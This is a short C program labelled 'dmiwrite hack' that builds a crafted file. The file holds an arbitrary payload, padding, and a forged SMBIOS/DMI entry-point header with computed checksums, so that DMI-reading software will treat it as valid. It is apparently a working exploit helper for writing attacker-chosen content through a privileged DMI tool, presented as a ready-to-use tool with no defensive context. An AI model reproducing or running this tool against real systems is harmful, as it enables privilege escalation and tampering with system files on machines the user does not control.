// dmiwrite hack
// Author: Adam Reiser

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "util.h"

#define DMI_HEADER_SIZE 32
#define MAX_PAYLOAD_SIZE 4096

// payload + first padding
#define BUFFER_SIZE 983040

// second padding
#define PADDING_SIZE 65536


int main(int argc, char * argv[]) {

    if (argc != 3) {
        printf("Usage: %s payload_file output_file\n", argv[0]);
        return 1;
    }

    char payload[MAX_PAYLOAD_SIZE];

    FILE *payload_fp = fopen(argv[1], "r");
    FILE *output_fp = fopen(argv[2], "w");

    int error_count = 0;

    fseek(payload_fp, 0L, SEEK_END);

    u16 payload_length = (u16) ftell(payload_fp);
    rewind(payload_fp);

    if (1 == fread(payload, payload_length, 1, payload_fp))
    {
        if (DEBUG)
            printf("Read payload of length %d from %s\n", payload_length, argv[1]);
    }
    else error_count++;

    if (1 == fwrite(payload, payload_length, 1, output_fp))
        printf("Wrote payload of length %d to %s\n", payload_length, argv[2]);
    else error_count++;

    size_t padding_1_size = BUFFER_SIZE - payload_length;
    u8 padding_1[BUFFER_SIZE] = {0};

    if (1 == fwrite(padding_1, padding_1_size, 1, output_fp))
        printf("Padding %lu bytes to %s\n", padding_1_size, argv[2]);
    else error_count++;

    u8 buf[DMI_HEADER_SIZE];
    memset(buf, 0, DMI_HEADER_SIZE);

    // magic number
    memcpy(buf, "_SM_", 4);

    // magic number
    memcpy(buf+0x10, "_DMI_", 5);

    // entry point length (0x07 - 0x1e)
    memset(buf+5, 0, 1);

    u8 major_version = 2;
    u8 minor_version = 1;
    u32 table_at = 0x00;
    u16 num_structs = 1;
    u8 bcd_revision = 0;
    u16 max_struct_size = 0;

    buf[6] = major_version;
    buf[7] = minor_version;
    u16 *max_struct_size_ptr = (u16*) (buf+0x8);
    u16 *payload_len_ptr = (u16*) (buf+0x16);
    u32 *base_addr_ptr = (u32*) (buf+0x18);
    u16 *num_structs_ptr = (u16*) (buf+0x1c);
    u8 *bcd_revision_ptr = (u8*) (buf+0x1e);
    memcpy(payload_len_ptr, &payload_length, 2);
    memcpy(max_struct_size_ptr, &max_struct_size, 2);
    memcpy(base_addr_ptr, &table_at, 4);
    memcpy(num_structs_ptr, &num_structs, 2);
    memcpy(bcd_revision_ptr, &bcd_revision, 1);

    if (set_checksums(buf))
    {
        if (1 == fwrite(buf,sizeof(buf),1, output_fp))
            printf("Wrote DMI header of length %d to %s\n", DMI_HEADER_SIZE, argv[2]);
    }
    else
    {
        printf("Could not set checksums for DMI header.\n");
        error_count++;
    }


    u8 padding[PADDING_SIZE] = {0};

    if (1 == fwrite(padding, PADDING_SIZE, 1, output_fp))
        printf("Padding %d bytes to %s\n", PADDING_SIZE, argv[2]);

    if (error_count == 0)
    {
        printf("Congratulations, %s looks like a valid DMI file.\n", argv[2]);
        return 0;
    }
    else
    {
        printf("Warning, %s may not be a valid DMI file.\n", argv[2]);
        return 1;
    }
}
